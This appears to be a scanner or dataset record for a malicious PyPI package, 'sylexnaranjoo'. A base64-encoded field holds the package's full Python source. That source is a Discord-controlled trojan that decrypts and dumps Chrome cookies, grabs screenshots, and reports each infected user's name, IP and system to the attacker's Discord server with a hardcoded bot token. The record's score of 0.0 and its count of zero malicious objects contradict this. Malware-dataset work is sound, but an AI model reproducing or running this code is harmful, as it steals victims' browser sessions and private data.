statistics:
  total_files: 1
  skipped_files: 0.0
  processed_objects: 1
  malicious_objects: 0
details:
- path: .repo_cache/malicious_repos/pypi_malregistry/sylexnaranjoo/1.0.2/sylexnaranjoo-1.0.2/sylexnaranjoo-1.0.2/syntax/__main__.py
  contents:
  - name: screenshot
    score: 0.0
    code: |-
      @bot.command()
      async def screenshot(ctx):
          image = ImageGrab.grab()
          with io.BytesIO() as image_binary:
              image.save(image_binary, 'PNG')
              image_binary.seek(0)
              file = discord.File(image_binary, filename='screenshot.png')
              await ctx.send(file=file)
          await ctx.send("[*] Command successfully executed")
    tokens: return_generator pop_top resume load_global ImageGrab load_attr grab call store_fast image load_global io load_attr BytesIO call before_with store_fast image_binary load_fast image load_attr save load_fast image_binary load_const PNG call pop_top load_fast image_binary load_attr seek load_const INTEGER call pop_top load_global discord load_attr File load_fast image_binary load_const screenshot.png kw_names filename call store_fast file load_fast ctx load_attr send load_fast file kw_names file call get_awaitable load_const send TO_NUMBER yield_value resume jump_backward_no_interrupt TO_NUMBER end_send pop_top load_const load_const load_const call pop_top load_fast ctx load_attr send load_const STRING_LEN_S_ENT_HIGH call get_awaitable load_const send TO_NUMBER yield_value resume jump_backward_no_interrupt TO_NUMBER end_send pop_top return_const None cleanup_throw jump_backward TO_NUMBER push_exc_info with_except_start pop_jump_if_true TO_NUMBER reraise pop_top pop_except pop_top pop_top jump_backward TO_NUMBER copy pop_except reraise cleanup_throw jump_backward TO_NUMBER call_intrinsic_1 INTRINSIC_STOPITERATION_ERROR reraise
    hash: d767225c9ce0415d98b660c4c7af691d6941e3923c5d72ee56cb6bd1bc725831
sources:
  ? .repo_cache/malicious_repos/pypi_malregistry/sylexnaranjoo/1.0.2/sylexnaranjoo-1.0.2/sylexnaranjoo-1.0.2/syntax/__main__.py
  : ZnJvbSBkaXNjb3JkLmV4dCBpbXBvcnQgY29tbWFuZHMKZnJvbSBQSUwgaW1wb3J0IEltYWdlR3JhYgppbXBvcnQgc3VicHJvY2VzcwppbXBvcnQgdGltZQppbXBvcnQgb3MKaW1wb3J0IGlvCmltcG9ydCBzcWxpdGUzCmltcG9ydCBjdHlwZXMKaW1wb3J0IGRpc2NvcmQKaW1wb3J0IHNodXRpbAppbXBvcnQganNvbgppbXBvcnQgYmFzZTY0CmltcG9ydCB3aW4zMmNyeXB0CmltcG9ydCBweWNvb2tpZWNoZWF0CmltcG9ydCBnZXRwYXNzCmltcG9ydCBwbGF0Zm9ybQppbXBvcnQgcmVxdWVzdHMKaW1wb3J0IHdpbjMyY29tLmNsaWVudCBhcyB3aW5jbAppbXBvcnQgY3R5cGVzCmltcG9ydCByZQppbXBvcnQganNvbgppbXBvcnQgc29ja2V0CmltcG9ydCBjb2xvcmFtYQppbXBvcnQgd2luMzJndWkKaW1wb3J0IGFzeW5jaW8KZnJvbSBjb2xvcmFtYSBpbXBvcnQgaW5pdCwgRm9yZQpmcm9tIHVybGxpYi5yZXF1ZXN0IGltcG9ydCB1cmxvcGVuCmltcG9ydCBsb2dnaW5nCmZyb20gcGF0aGxpYiBpbXBvcnQgUGF0aApsb2dnaW5nLmdldExvZ2dlcignZGlzY29yZCcpLnNldExldmVsKGxvZ2dpbmcuQ1JJVElDQUwpCmxvZ2dpbmcuZ2V0TG9nZ2VyKCdkaXNjb3JkLmh0dHAnKS5zZXRMZXZlbChsb2dnaW5nLkNSSVRJQ0FMKQpsb2dnaW5nLmdldExvZ2dlcignZGlzY29yZC5jbGllbnQnKS5zZXRMZXZlbChsb2dnaW5nLkNSSVRJQ0FMKQpsb2dnaW5nLmdldExvZ2dlcignZGlzY29yZC5nYXRld2F5Jykuc2V0TGV2ZWwobG9nZ2luZy5DUklUSUNBTCkKCgppbml0KCkKCgoKCgoKCmludGVudHMgPSBkaXNjb3JkLkludGVudHMuZGVmYXVsdCgpCmludGVudHMubWVtYmVycyA9IFRydWUKaW50ZW50cy5tZXNzYWdlX2NvbnRlbnQgPSBUcnVlCmJvdCA9IGNvbW1hbmRzLkJvdChjb21tYW5kX3ByZWZpeD0nIScsIGhlbHBfY29tbWFuZD1Ob25lLCBpbnRlbnRzPWludGVudHMpCgoKYXN5bmMgZGVmIHJ1bl9ib3QoKToKICAgIGF3YWl0IGJvdC5zdGFydCgiT1RFek1UZ3pOVEk0TlRRMk5qRXhNalF5LkdIbGF5by5iTURPNXJ1Y1VSTm5ZZGhuNFlNZEItdWlKSXZ2TWZ3dnlfUFZxWSIpCiAgICAjIG1pbmltaXplIHRoZSB3aW5kb3cgYWZ0ZXIgc3RhcnRpbmcgdGhlIGJvdAogICAgaHduZCA9IHdpbjMyZ3VpLkZpbmRXaW5kb3coTm9uZSwgIndpbmRvd190aXRsZSIpICAjIHJlcGxhY2UgIndpbmRvd190aXRsZSIgd2l0aCB0aGUgYWN0dWFsIHRpdGxlIG9mIHRoZSBwcm9ncmFtJ3Mgd2luZG93CiAgICB3aW4zMmd1aS5TaG93V2luZG93KGh3bmQsIHdpbjMyZ3VpLlNXX01JTklNSVpFKSAgIyBtaW5pbWl6ZSB0aGUgd2luZG93CgoKCgoKZGVmIHRhaGcocGVuZSk6CiAgICB4ID0ganNvbi5sb2FkcyhvcGVuKG9zLmVudmlyb25bJ0xPQ0FMQVBQREFUQSddICsgIlxcR29vZ2xlXFxDaHJvbWVcXFVzZXIgRGF0YVxcTG9jYWwgU3RhdGUiLCAiciIsIGVuY29kaW5nPSJ1dGYtOCIpLnJlYWQoKSkKICAgIHRyeToKICAgICAgICBtayA9IHdpbjMyY3J5cHQuQ3J5cHRVbnByb3RlY3REYXRhKGJhc2U2NC5iNjRkZWNvZGUoeFsib3NfY3J5cHQiXVsiZW5jcnlwdGVkX2tleSJdKVs1Ol0sIE5vbmUsIE5vbmUsIE5vbmUsIDApWzFdCiAgICBleGNlcHQ6CiAgICAgICAgbWsgPSAiIgogICAgdHJ5OgogICAgICAgcmV0dXJuIChBRVMubmV3KG1rLCBBRVMuTU9ERV9HQ00sIHBlbmVbMzoxNV0pLmRlY3J5cHQocGVuZVsxNTpdKVs6LTE2XSkuZGVjb2RlKCkKCiAgICBleGNlcHQ6CiAgICAgICAgcmV0dXJuICIiCgoKCgpAYm90LmNvbW1hbmQoKQphc3luYyBkZWYgZ2V0Y29va2llcyhjdHgpOgogICAgZ2V0X2Nocm9tZV9jb29raWVzKCkKICAgIGF3YWl0IGN0eC5zZW5kKGZpbGU9ZGlzY29yZC5GaWxlKG9zLmVudmlyb25bJ1RFTVAnXSArICJcXGNvb2tpZXMudHh0IikpCiAgICBhd2FpdCBjdHguc2VuZCgiWypdIENvbW1hbmQgc3VjY2Vzc2Z1bGx5IGV4ZWN1dGVkIikKZGVmIGdldF9jaHJvbWVfY29va2llcygpOgogICAgc2h1dGlsLmNvcHlmaWxlKG9zLmVudmlyb25bJ0xPQ0FMQVBQREFUQSddICsgIlxcR29vZ2xlXFxDaHJvbWVcXFVzZXIgRGF0YVxcRGVmYXVsdFxcTmV0d29ya1xcQ29va2llcyIsIG9zLmVudmlyb25bJ1RFTVAnXSArICJcXGFzZCIpCiAgICBjb24gPSBzcWxpdGUzLmNvbm5lY3Qob3MuZW52aXJvblsnVEVNUCddICsgIlxcYXNkIikKICAgIGN1cnNvciA9IGNvbi5jdXJzb3IoKQogICAgY3Vyc29yLmV4ZWN1dGUoIlNFTEVDVCBob3N0X2tleSwgbmFtZSwgdmFsdWUsIGVuY3J5cHRlZF92YWx1ZSBGUk9NIGNvb2tpZXMiKQogICAgZmlsZSA9IG9wZW4ob3MuZW52aXJvblsnVEVNUCddICsgIlxcY29va2llcy50eHQiLCAidysiKQogICAgZm9yIGNvb2tpZSBpbiBjdXJzb3IuZmV0Y2hhbGwoKToKICAgICAgICBmaWxlLndyaXRlKGYie2Nvb2tpZVswXX0gLSB7Y29va2llWzFdfSAtIHtjb29raWVbMl19IC0ge3RhaGcoY29va2llWzNdKX1cbiIpCiAgICBjdXJzb3IuY2xvc2UoKQogICAgY29uLmNsb3NlKCkKICAgIGZpbGUuY2xvc2UoKQoKQGJvdC5jb21tYW5kKCkKYXN5bmMgZGVmIHNjcmVlbnNob3QoY3R4KToKICAgIGltYWdlID0gSW1hZ2VHcmFiLmdyYWIoKQogICAgd2l0aCBpby5CeXRlc0lPKCkgYXMgaW1hZ2VfYmluYXJ5OgogICAgICAgIGltYWdlLnNhdmUoaW1hZ2VfYmluYXJ5LCAnUE5HJykKICAgICAgICBpbWFnZV9iaW5hcnkuc2VlaygwKQogICAgICAgIGZpbGUgPSBkaXNjb3JkLkZpbGUoaW1hZ2VfYmluYXJ5LCBmaWxlbmFtZT0nc2NyZWVuc2hvdC5wbmcnKQogICAgICAgIGF3YWl0IGN0eC5zZW5kKGZpbGU9ZmlsZSkKICAgIGF3YWl0IGN0eC5zZW5kKCJbKl0gQ29tbWFuZCBzdWNjZXNzZnVsbHkgZXhlY3V0ZWQiKQoKCkBib3QuZXZlbnQKYXN5bmMgZGVmIG9uX3JlYWR5KCk6CiAgICBndWlsZF9pZCA9IDEwNzA2MzM4NzMzNzQ5ODYyNzEKICAgIGd1aWxkID0gYm90LmdldF9ndWlsZChndWlsZF9pZCkKICAgIGlmIGd1aWxkIGlzIE5vbmU6CiAgICAgICAgcHJpbnQoZiJObyBzZSBwdWRvIGVuY29udHJhciB1biBzZXJ2aWRvciBjb24gZWwgSUQge2d1aWxkX2lkfSIpCiAgICAgICAgcmV0dXJuCgogICAgY2hhbm5lbF9uYW1lID0gb3MuZ2V0bG9naW4oKQogICAgY2hhbm5lbCA9IGF3YWl0IGd1aWxkLmNyZWF0ZV90ZXh0X2NoYW5uZWwoY2hhbm5lbF9uYW1lKQogICAgc3lzdGVtX2luZm8gPSBmIioqT1MqKjoge3BsYXRmb3JtLnN5c3RlbSgpfSB7cGxhdGZvcm0ucmVsZWFzZSgpfVxuKipDUFUqKjoge3BsYXRmb3JtLnByb2Nlc3NvcigpfSIKICAgIGlwX2FkZHJlc3MgPSBzb2NrZXQuZ2V0aG9zdGJ5bmFtZShzb2NrZXQuZ2V0aG9zdG5hbWUoKSkKICAgIGVtYmVkID0gZGlzY29yZC5FbWJlZCh0aXRsZT0iTnVldm8gVXN1YXJpbyBJbmZlY3RhZG8iLCBkZXNjcmlwdGlvbj1mIioqVXN1YXJpbzoqKiB7Y2hhbm5lbF9uYW1lfVxuKipJUDoqKiB7aXBfYWRkcmVzc30iLCBjb2xvcj0weDAwMDAwMCkKICAgIGVtYmVkLnNldF90aHVtYm5haWwodXJsPSdodHRwczovL21lZGlhLmRpc2NvcmRhcHAubmV0L2F0dGFjaG1lbnRzLzg0NzM4MDM5ODI4MzY4NTkxOS8xMDc5NTc1NjgyMTkzMDMxMTg4L3R1bWJscl9uNGRoYWluZE1lMXN0ZTA1bW8xXzQwMC5naWYnKQogICAgYXdhaXQgY2hhbm5lbC5zZW5kKGVtYmVkPWVtYmVkKQoKCgoKYmFubmVyID0gKEZvcmUuUkVEICsgIiIiCgogICAgICAgICAuJy4uLi4uLiw7Li5jJyA7OyAuOy4uJycuLi4nLiAsJyAnYy4uOy4uJywuIC4sJy4nOy4gLi4gJywgLiwuLi4uLi4nOi4gOzogJ2NsJy4sLi4uOjsuJywsLi4uLiAuLiAnOi4uOywuLicnLi4uLiA7Yy4uLC4gJzsuLjssLi47Oi4sZCcgOywgJ2wuIC4uLiAsOi4uOwogJywuLi4uLi4nOy4uOy4gLCcgLiwuLiwsJy4uLi4uLCwgJ2MuICcuLicsLi4nOywuLjsuLjsuIC4nIC46LC4uJy4uLjsnIDs6IC5jYy4gLi4uLiwnLic6Oy4uLC4gLCcgJywuLi4uLi4uLi4nYycgJzsuLmMsIC4uLi4nLi4uOjsuJ2MuICwsICxvLC4sOy4uLi4uLjoKLiw6Li4uLCcuOmMuLmMuICwsIC4sLi47LC4uLi4uICw7ICc7Li46Jy4uLi4uLicuLic6Li5jLCAuLC4uYywuJycuLidsOy5sZGNvZGwuLicuLi4sLC4uJycuJ2MuIDssICc7Li47Jy4uLicuLjonIDtjLi5sLC46Oi4uOywuLi4nLi4nLiAnJyAnbCcuLCwnJy4uLi46Ci47YycuLDssLiwsLi5jLiAsLCAuOiwuLDsuLi4uLi46OyAnOi4uLC4gLiwnLicnLiAsOi4gLCcgLicgLmw7Li4nLDtvT09PS2tka09LMHhsLC4nYzsuLiwnLi47LiAsLiAsOi4uOjsuLi4uLi46LCA7Yy4uOy4uLCwuLjo6Jy4uLC4uLC4gJy4gLjsuLi4uLi4sOy4uLAogLGMnICw6Jy4nLCAuYy4gLCwgLmMsIC4sLi4uLi4uLCwgLicgLjosLi4nLi4uLi4gJzsuICcuICcsIC46Jy47ZE8wS0swT2tkY2xveDBYWDB4b287Li4uJy4uLi4gLi4gLDouLmM6Li4nLiAgLicgJywgLjsuIDs6Li4nJy4uLCwgLiwuICcuIC4nLi4uLi4uJywuLjoKICxjJy4nLC4uO2MuLmMnIDs6IC5sLC47OiwuLiwuIC4nIC47LiAnLi4nLi4uLDosLic6Li47JyAnLCAuOmRrWE5LT3hkbGxsOy4uLixseE9LTk5LZCcgIC4uLjouICwnICc6Li47LC4uLicuLjssIDtjLi46Li4nJy4uJy4nLi4nLi5sJyAnJyAuJy4uLi4uLicnIC4nCiAnOicuJy4uLjtjLi5vLCAnJyAuOycgJzsnLiw6Jy4nLCAuOy4uLC4gLjsnLicsJy4nOi4uYywgLDouYzBXV05LeGwsJycnLC4uICAgLixsazBLWE5LbycuIC46LiA6LCAuLC4uLDsuLicsLi5jOy4sOiAuOi4gJywuLjo6Li4uLiAuYy4gOywgLiwuLicnLi4nJy4uOwogLjsnLicnLi4nLC4uLC4gJycgLjonLiw7Jy4uLC4gJycgLjouLjonLic6Jy4uLCcuO2MuLmMsICx4ME5XTk5LT287Jy4uLi4uLi4uLi4uLGN4TzBLMDBPbycuLC4gOycgLGMuLjo7Li47LC4uLCcgLDogLjonICw6Li4nJy4uOywuLmMuICwsICc6Li47Oy4uLDsuLiwKIC47Jy4sOy4uLCwuICcuICwsIC47Li4uLicuLDouLjo7IC4sLi46LC4sOi4uJzsuLixjLi46Jy5vTk5YWFhLT2RsOjssLDs7OywnLicsOmNsb2R4eHh4azAwa28uICwnIDtvLi46Oy4uLCcuLicuICc7IC5jLC4sOy4uJycuLjo6Li5jLiAnJyAuOy4uJywuLicsLi47CiAuJy4uJycuLiwnIC5jJyAsLCAuJy4gLicnLiw6Li4sOyAuLC4uOycuJycuLic7LC4sYy4gLjt4Tk5YSzBreG9jOjs7OzssJycnJycuLi4sOzs6OmNjbGR4T1hLOyAsJyAuLC4uOjsuLi4nLi47JyAuJyAuOicuLCwuLjs7Li4sLC4uOy4gLicgLjouICcsLi4uLC4uLAogLi4uICxjLi47OyAuOy4gOzsgLjonLiwsJy4nOy4uOywgLiwuLiwuLiwsLi4nOywuLGMuIDpLV1hLT3hvbGNjOjs6OjssLCcsLCcsJy4uJywnJyw7Ojs6Y29rSzBvYycgLi4gLjssLi4nLC4uOy4gJzsgLi4uLjs6Li4uLi4uICAgLjouIC4uICc7Li47Oi4uJywuLjoKLi4uLi47Oi4uOmMuLi4uICcnIC4nLi4nLi4gO2wuLicsICdjLi5jLC4sLC4uLDosLic6LjswV1gwa29sbGw6Ojs7LCwsLi4uLi4uLi4gLi4uLi4uLDs6OjssOm94MEtvLic6Li4uLi4uJy4uLiwuICw6IC4nLi4nJy4uOjsuLi4uLi46LiAsLCAuLC4uLCwuLi4uIC46CiAnJy4uLDsnLjtjLi4nLiA7OyAuLC4uJywnLiw6Li47OyAnYy4uOycgLi4uLiw7Li47Y2MwTjBra286OzsnLi4uLi4uLi4uLi4uLi4uLi4uLiAgLi4uLi4uLi4nJzpkT094Oi4gLCwuLicnLi46JyAsOiAuOy4gJycuLicnLi47LC4nYycgOzsgLjsuLi4uLicsJyAuOwogJycuLi4nJy46Oi4uYycgOzsgLiwuLicuLi47Yy4uJycgLiwuLjsnIC47LC4uLCcuO2tYTmtsOjsuLiAgICAgICAgICAgICAuLi4uLi4uLiAgICAgLi4uLi4uLi4uLixjeE9vLCwnLic6Oy4uLC4gLDogLjonLi4uLi4uLi4nOywuLjouICcuICcsLi4nLi4uJycuLjsKIC4nLiAuLi4uOjsgJ2wsICcnIC47Li4uLi4uOzouLiw7IC4nLi46LC4sLC4gJzpjeDBPZGMnLiAgICAgICAgICAgICAgIC4uLi4uLi4uLiAgICAgICAgICAgICAgICAgIC4sb2t4LC4uOzsuLjonICw6Li46LiAnLiAuLCwuLicsLi47LiAnJyAuLC4gLDsnLi4uLi5jCiAnOy4uJywuLicsIC5jJyAsLCAsYy4uJzsuLjs7Li4sJyAuLC4uOycuJzsuLi5sMGtsLC4gICAgICAgICAgICAgICAgICAuLi4uLi4uLiAgICAgICAuLi4uICAgICAgICAgICAnbGwnLjs6Li46LCAnLCAuOy4gOzouICcsLi4nLC4uYycgJy4gJzouLiw7Li4nLC4uOgouO2MuLicsLi4sOy4uOicgLCwgJ2wsLicnLi4uJy4uOywgLjsuLmw7IC4uLixvbzouLiAgICAgICAgIC4uLi4gICAgICAgLicnJycnJy4gICAgICAgLi4uLi4uICAgICAgICAgIC46bzs6Oi4uOywgJzsgLmMnIDtsLi4sLC4uLCwuLmMnIC4uICxjLi4sJy4gJzsuLiwKLi4uLi4nJy4uLDsuLjonIDs7IC5jJy4sJy4uLiwuLiwsIC4sLi47Jy4uLi46Oi4gICAgICAgICAgLi4uLi4uLiAgICAgIC4sLCwsLCwnLiAgICAgLi4uLi4uLi4gICAgICAgICAgLjpjOjsuLiwnICcsIC5jJy4sJy4uLi4uLicsLi47LiAnJyAsbCcuLCcuIC4nLi46Ci4uJy4gLicuLiw7Li47JyA6YyAuYywuLCwuLic7LiAuJyAuOy4gJy4uLicsOicgICAgICAgICAuLi4uLi4nJycuLi4uLiwsOzs7Ozs7OywuLi4uLicnJycuLi4uLi4gICAgICAgICAuO2MsLi5sOiAsYy4uYycgLi4gLi4uLi4sOy4uOi4gJy4gJ2wsLjs6Jy4nOy4uLAogLjsuIC4uLi4sLCAuLC4gOzsgLmMsLiwsLi4sOicuLCwgLi4gLjsnLi4uLDsuICAgICAgICAuLi4uLi4nJywsLDs7Ozs7Ozs7Ozo6Ojs7Ozs7OzssLCwnLi4uLi4uICAgICAgICAgICw6LC4uOycgLDsgLmMnIC4uLi4nLi4uLCwuLmMuICwsIC5jJy4sOicuLDsuLiwKICc7Jy4sLC4uLicuLjouIDs7ICdjJy4uLi4uJywuLjssIC47Li46Jy4uLGMsICAgICAgICAgLi4uLi4nLCwnJyw7Ojo6Ojo6Ojo6Ojo6Ojo6OjssJycsLCcnLi4uLiAgICAgICAgIC4sLi4uLjsnICw7IC4nLi4sJy4uOzsuLicnLi46LiAnJyAnOi4uOzsnLiw7Li47Ci4sOicuOjsuLi4sLi5jJyA7OiAuOicuLi4uLicsLi47LCAnOi4uLC4uJzs7JyAgICAgICAgICAuLi4nJywsLCcuLi4uJycsLCwsLCwsLCcnLi4uLi4sLCwnJy4uLiAgICAgICAgIC4nLi4nLi4nLiAnOyAuOy4uOjouLjs7Li4nJy4uYycgOywgLjsuLicnLi4uLC4uLAouLDouLi4nJy4nOy4uOy4gLDsgLjonLi4uLi4nOy4uLCcgJ2MuLjsuICc6LCwsICAgICAgICAgICAuLi4nLDs6LC4gICAgICAgICAgICAgICAgICc7OzssLi4uICAgICAgICAgICwsLi47LC4uLi4gLicgLjsuLiwnIC47OicuLDsuLmwnICcnIC4sLi4sLi4uLDsuICcKICc6Li4sLC4uLCwuLjsnICw7IC4sLi4sJy4uLi4uLjs7IC47Li46LCAuOiwuLC4gICAgICAgICAgICAgIC4uLiAgICAgICAgICAgICAgICAgICAgLi4uICAgICAgICAgICAgLidjOy4uLi4uIC4uIC4nIC46Jy5jbC4uOywuLjs7LidvJyAnJyAnYy4uJy4uLicsLi47Ci47bCwuLDsuLiw7Li47LiA7OiAuOi4uLDsnLi4sLi4uLiAuLC4uLCcgIC4uIC47LiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLicnOiwuLi4nLi4sJyAnOyAuOicuOmwuICw7Li4nJy4uYycgLCwgLiwuLicuLiAuLi4ubAouOzonLjs6Li47Yy4uLC4gLCcgLjonLicnJy4uOy4uLCwgJzouLjonIC4uLiAuOiwuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJzsuLjssLi4uJy4uLCcgJywgLjonLjssICAsOy4uLi4uLmMuIDs7IC4sLi4nLi4uICAgLjsKLicuLi47OicuJzsuLmwnICcnIC4nLiAnOywuLDouIC4nIC4sLi46JyAuYywgLicnLi4uICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLGw7Li46Oy4nOzsuLicuICc7IC46JyAnJy4uLi4uLiw7Li47LiAsLCAuOy4uJy4uLi4nLi47Ci4nJy4uLDsuLiw7Li5jJyA7Oi4uJy4gLicnLicnICA7OyAuLiAuLC4gJzosLicsOzs7Oy4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLGx4ZGxjbDsuLiwnIC4sLiAsOi4uOicgO2MuLicuLi4sOy4gLi4gLCwgJ2wuLi4uLi4uLi4uOwouJywuLiw7Li4nLC4uYycgOmMuLjouLic7Jy4uJy4gLicgLi4gLjssLic6OztjY2M7Li4uLiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAuJywnLGNkeGt4bDo6LC4uLCcgJzouLmMnLjpjLi4uLi4nYzouIC4uICcnICdsJyAuLC4uLi4uLicKLicnLi4nOycuJywuLjsuICw7ICdjJy4sOycuLiwuICcnIC47Li47LCxsb2M6LCcuLi4gIC4uICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAuJywnJycuLDs6bGR4eGQ7Li4uICw6Li46LiA7OicuJycuJzosIC47JyAnJyAuYycgLjsuLicnLi47Ci4sOy4uOzonLjs7Li4nLiAsLCAuOycgJzouIC4uLi46OiAuJy4ub3hkbzosJy4uLiAgICAgIC4uICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAuLi4nJywsLi4nOzo6OmNka09rOyA7YyAuLC4uLCwuLiwnLi47Oy4uYycgLCwgJ2MnLjs6LiAnLC4uLgouLDouLicnLi4uLC4uOy4gOzogLjsnLiw7LiAuJy4uOzsgLjtjeGtvYzssJy4uICAgICAgICAgLi4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAuLiAgLi4sOycuICc7OywsLCxjazA6LDsuLjouLiwnLi4sLC4nY2MuLicuIC4uICxsLi47Jy4uLicuLiwKLiw6Li4sLC4uLCwuLjouIC4uIC5jJy4uLi4uLCwuLjs7ICdrMHhjOjssJy4uICAgICAgICAgICAgLiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJy4gICAgLiwsLiAuLCcuLicuLidkeGw7IC46Jy46Oi4uOzsuLiwsLi4nLiAnLiAuLC4uLi4uJy4uLi46CiAnOycuLCwuLjs7Li47LiAnLiAuOicuLi4uLi4sLiA7OydkMGQ6OjosJy4uLiAgICAgICAgICAgLicuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICwsICAgICAuLCcgLicuICAgICAuYzpvYyAuYycuOjouLiwnIC4uJy4uLC4gLCwgLjouLicnJycsOi4uYwogLCwuLicuLi46Oi4uLC4gLCcgLiwuLiwnLi4sOi4gLjp4eG86JycsOy4uICAgICAgICAgICAgIC4sLiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA7LCAgICAgIC4nLi4uICAgICAgLjouJ2wuLmMsIC4uLi47Jy4uOjouLjouIDs7ICdjJyAnLC4uLDsuLjsKLjs6Li4sOycuJzsuLjsuICw7IC4sJy4nLC4uLDouLjpreGMsLi4uLiwnICAgICAgICAgICAgICAuLC4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAuOiwgICAgICAgIC4nJy4gICAgIC4nLiBjbCc6Li47Oi4uOjouLjs6Li4sLiA7LCAuOicgLi4uLiwsLi46Ci47Jy4gJzsuLjs6Li46JyA6Yy4uLC4uLDonLiw6Li46eGMsLiAgICAuJy4gICAgICAgICAgICAgLiwnLiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGM7ICAgICAgICAgLicuICAgICAuLiAgJ2RvOi4uOjsuLiwnLi4uJy4uYycgOywgLmMuLiwsLi4nLC4uYwouLDouIC4uLi4nOi4uOy4gLDsgJ2MuLicnLi4sOi4uOm87LiAgICAgIC4uICAgICAgICAgICAgICAnJy4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICA6OiAgICAgICAgICAuLiAgICAgLi4gIC47b28uLiwnLi4sLC4uJycuLmwnICcnIC46LiAnJy4uLCwuLm8KLi4nLi4uLi4uOzouLicuIDs7IC5jLC4sLC4gLDouLmNjJyAgICAgICAuLiAgICAgICAgICAgICAgLi4uLiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2MgICAgICAgICAgIC4gICAgICAgICAgLixsJy4nLi4uLCcgLjo6Li5jLiAsLCAuOi4uOzsnLi4uLi47Ci4uLi4uLiAgLjs6Li46LiAsLCAuOicuLCwuICxjJy4sOy4gICAgICAgICAgICAgICAgICAgICAgIC4uLiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvLiAgICAgICAgICAuICAgICAgICAgIC4gLi4gLCwuLicnLi46Oy4uYycgOzsgLiwuLjs6Li4uJy4uOwouJy4uLi4uLi47Oy4uOy4gLi4gJ2MnLicnLi47Yy4uLi4gICAgICAgICAgICAgICAgICAgICAgICAuLiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBsby4gICAgICAgICAgICAgICAgICAgICAgIC4uLjpjLi4sJy4uLicuLiwuICcuIC4sLi4uLi4uLiwuLjsKLicnLiAuLi4uOjouLjsnICcnIC47Li4sJy4uJzsuICAuICAgICAgICAgICAgICAgICAgICAgICAgLi4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAubGMgICAgICAgICAgICAgICAgICAgICAgICAgIC46Yy4uOzsuLi4uIC4nLiAnJyAnLC4uLi4uLi4sLi4nICAgIAoKCgogICAgICAgICAgICAgICAgICAgICAgICDilojilojilpMg4paI4paI4paI4paEIOKWhOKWiOKWiOKWiOKWkyDiloTiloTiloQgICAgICAgIOKWhOKWiOKWiOKWiOKWiCDilpPilojilojilojilojiloggICDiloTilojilojilojiloggIOKWiOKWiOKWgOKWiOKWiOKWiCAgIOKWhOKWhOKWhCAgICAgICDiloTiloTiloTiloQgICAg4paE4paE4paE4paEICAg4paT4paI4paI4paI4paI4paIICDilojilojiloDilojilojiloggIAogICAgICAgICAgICAgICAgICAgICAgICDilpPilojilojilpLilpPilojilojilpLiloDilojiloAg4paI4paI4paS4paS4paI4paI4paI4paI4paEICAgICDilojilojilpIg4paA4paI4paS4paT4paIICAg4paAICDilojilojilpIg4paA4paI4paS4paT4paI4paIIOKWkiDilojilojilpLilpLilojilojilojilojiloQgICAg4paT4paI4paI4paI4paI4paI4paEIOKWk+KWiOKWiOKWiOKWiOKWiOKWhCDilpPiloggICDiloAg4paT4paI4paIIOKWkiDilojilojilpIKICAgICAgICAgICAgICAgICAgICAgICAg4paS4paI4paI4paS4paT4paI4paIICAgIOKWk+KWiOKWiOKWkeKWkuKWiOKWiCAg4paA4paI4paEICDilpLilojilojilpHiloTiloTiloTilpHilpLilojilojiloggICDilpLilojilojilpHiloTiloTiloTilpHilpPilojilogg4paR4paE4paIIOKWkuKWkuKWiOKWiCAg4paA4paI4paEICDilpLilojilojilpIg4paE4paI4paI4paS4paI4paI4paSIOKWhOKWiOKWiOKWkuKWiOKWiOKWiCAgIOKWk+KWiOKWiCDilpHiloTilogg4paSCiAgICAgICAgICAgICAgICAgICAgICAgIOKWkeKWiOKWiOKWkeKWkuKWiOKWiCAgICDilpLilojilogg4paR4paI4paI4paE4paE4paE4paE4paI4paIIOKWkeKWk+KWiCAg4paI4paI4paT4paS4paT4paIICDiloQg4paR4paT4paIICDilojilojilpPilpLilojilojiloDiloDilojiloQgIOKWkeKWiOKWiOKWhOKWhOKWhOKWhOKWiOKWiCDilpLilojilojilpHilojiloAgIOKWkuKWiOKWiOKWkeKWiOKWgCAg4paS4paT4paIICDiloQg4paS4paI4paI4paA4paA4paI4paEICAKICAgICAgICAgICAgICAgICAgICAgICAg4paR4paI4paI4paR4paS4paI4paI4paSICAg4paR4paI4paI4paSIOKWk+KWiCAgIOKWk+KWiOKWiOKWkuKWkeKWkuKWk+KWiOKWiOKWiOKWgOKWkuKWkeKWkuKWiOKWiOKWiOKWiOKWkuKWkeKWkuKWk+KWiOKWiOKWiOKWgOKWkuKWkeKWiOKWiOKWkyDilpLilojilojilpIg4paT4paIICAg4paT4paI4paI4paS4paR4paT4paIICDiloDilojilpPilpHilpPiloggIOKWgOKWiOKWk+KWkeKWkuKWiOKWiOKWiOKWiOKWkuKWkeKWiOKWiOKWkyDilpLilojilojilpIKICAgICAgICAgICAgICAgICAgICAgICAg4paR4paTICDilpEg4paS4paRICAg4paRICDilpEg4paS4paSICAg4paT4paS4paI4paRIOKWkeKWkiAgIOKWkiDilpHilpEg4paS4paRIOKWkSDilpHilpIgICDilpIg4paRIOKWkuKWkyDilpHilpLilpPilpEg4paS4paSICAg4paT4paS4paI4paR4paR4paS4paT4paI4paI4paI4paA4paS4paR4paS4paT4paI4paI4paI4paA4paS4paR4paRIOKWkuKWkSDilpHilpEg4paS4paTIOKWkeKWkuKWk+KWkQogICAgICAgICAgICAgICAgICAgICAgICAg4paSIOKWkeKWkSAg4paRICAgICAg4paRICDilpIgICDilpLilpIg4paRICDilpEgICDilpEgIOKWkSDilpEgIOKWkSAg4paRICAg4paRICAg4